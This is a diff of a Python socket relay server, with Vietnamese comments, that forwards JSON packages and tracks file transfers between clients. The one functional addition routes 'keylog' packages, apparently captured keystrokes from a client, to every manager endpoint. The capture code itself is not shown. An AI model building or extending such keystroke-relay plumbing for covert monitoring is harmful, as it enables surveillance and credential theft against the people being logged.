@@ -8,7 +8,6 @@ import socket
 # Biến dùng chung cho tất cả các luồng ServerTransferHandler
 transfer_conns = {}  # {IP_Address: socket_object}
 transfer_lock = threading.Lock()
-# ⚡ BỔ SUNG: Hàng đợi cho các gói tin chưa được chuyển phát
 unserved_queues = {}  # {IP_Address: [list_of_full_packages_bytes]} 
 
 class ServerTransferHandler:
@@ -88,7 +87,7 @@ class ServerTransferHandler:
             pkg["sender"] = self.ip 
             pkg_type = pkg.get("type")
             
-            # --- Cập nhật trạng thái truyền file (Giữ nguyên logic cũ) ---
+            # --- Cập nhật trạng thái truyền file ---
             if pkg_type == "file_meta":
                 self.file_transfer_state["is_active"] = True
                 self.file_transfer_state["target_ip"] = target_ip
@@ -97,11 +96,15 @@ class ServerTransferHandler:
                 self.file_transfer_state["bytes_processed"] = 0
                 print(f"[SERVER-TRANSFER] File meta received. Size: {file_size}. Relaying meta...")
             elif pkg_type == "file_data":
-                estimated_bytes = pkg["data"].get("bytes", 0) # Sử dụng bytes_len thực tế
+                estimated_bytes = pkg["data"].get("bytes", 0) 
                 self.file_transfer_state["bytes_processed"] += estimated_bytes
             elif pkg_type == "file_end":
                 print(f"[SERVER-TRANSFER] File transfer complete ({self.file_transfer_state['file_size']} bytes).")
                 self.file_transfer_state["is_active"] = False
+
+            if pkg_type == "keylog":
+                target_ip = 'all' # Bắt buộc gửi tới Manager
+                print(f"[SERVER-TRANSFER] Received KEYLOG from {self.ip}. Relaying to Managers.")
             
             # ⚡ Relay gói JSON (hoặc ĐƯA VÀO HÀNG ĐỢI)
             if target_ip:
